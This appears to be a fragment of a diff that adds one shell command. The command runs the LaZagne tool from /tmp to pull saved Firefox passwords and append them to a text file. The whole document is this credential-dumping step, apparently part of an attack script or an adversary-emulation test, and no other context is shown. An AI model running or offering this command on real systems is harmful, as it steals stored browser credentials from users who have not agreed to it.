@@ -1,0 +1,1 @@
+python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt
